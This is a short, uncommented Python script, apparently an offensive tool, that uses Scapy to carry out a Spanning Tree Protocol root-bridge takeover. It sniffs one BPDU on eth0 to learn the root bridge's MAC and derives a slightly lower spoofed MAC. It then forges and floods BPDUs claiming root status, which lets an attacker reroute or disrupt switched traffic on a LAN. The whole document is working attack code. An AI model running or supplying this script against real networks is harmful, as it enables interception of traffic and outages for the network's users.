#coding:utf-8
from scapy.all import *

rootmac="";

def hex2value(char):
    if char is 'a':
        return 10;
    elif char is 'b':
        return 11;
    elif char is 'c':
        return 12;
    elif char is 'd':
        return 13;
    elif char is 'e':
        return 14;
    elif char is 'f':
        return 15;
    else:
        return int(char);

def hex2ord(string):
    a = hex2value(string[0]);
    b = hex2value(string[1]);
    return str(hex(a * 16 + b - 1))[2:];

def watchSTP(pkt):
    global rootmac;
    if(pkt[STP]):
        rootmac = pkt[STP].rootmac;

sniff(prn=watchSTP, filter="stp", iface="eth0", store=0, count=1);
print rootmac;
macAddr = rootmac.split(":");
macAddr[3] = hex2ord(macAddr[3]);
mac = ":".join(macAddr);
print mac;

stp =  Dot3() / LLC() / STP();
stp[Dot3].src = mac;
stp[Dot3].dst = "01:80:c2:00:00:00";
stp[STP].rootid = 32768;
stp[STP].bridgeid = 32768;
stp[STP].rootmac = mac;
stp[STP].bridgemac = mac;
stp.show();
sendp(stp, inter=2, count=100, loop=1);

